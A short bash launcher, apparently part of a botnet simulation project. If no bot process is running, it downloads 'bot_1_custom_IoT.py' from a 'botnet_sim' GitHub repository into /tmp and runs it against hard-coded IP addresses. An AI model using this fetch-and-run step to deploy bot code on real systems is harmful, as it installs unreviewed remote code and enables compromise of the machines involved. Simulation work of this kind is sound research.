#! /bin/bash
ps ax | grep "bot.py" | grep -v grep;
if test $? -eq 0; 
then 
    echo "Process already running."
else 
    echo "Starting process."
    /usr/bin/curl -X GET https://raw.githubusercontent.com/dcsrps/botnet_sim/master/bot/bot_1_custom_IoT.py > /tmp/bot.py
    python3 /tmp/bot.py 172.19.75.109 192.168.1.1 &
fi
